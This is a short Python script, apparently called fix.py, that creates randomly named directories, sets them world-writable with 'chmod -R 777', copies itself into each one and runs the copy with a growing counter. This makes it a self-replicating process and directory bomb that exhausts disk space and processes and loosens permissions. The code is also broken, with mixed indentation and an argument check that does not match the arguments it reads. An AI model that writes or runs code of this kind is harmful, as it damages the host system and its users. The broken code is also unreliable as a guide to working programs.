import os
import random
import shutil
import sys

#Creates a current path, either starting one or dynamic
if(len(sys.argv) != 2):
    path = os.path.abspath(os.getcwd())
	number = 1
else:
    path = str(sys.argv[1])
    number = str(sys.argv[2])
    number = int(number)

#Create a list of potential directory names
names = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","w","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","R","S","T","U","W","Y","Z"]


#Start the loop for specified repetitions
for i in range (0, number):
	#Create a directory with a given name
	name = random.choice(names)
	new_path = f"{path}/{name}"
	os.mkdir(new_path)
	#Place a duplicate of the script inside and execute simultaneous script
	os.system(f"chmod -R 777 {new_path} ")
	shutil.copy(f"{path}/fix.py", new_path)
	number += 1
	os.system(f"python3 {new_path}/fix.py {new_path} {number}")

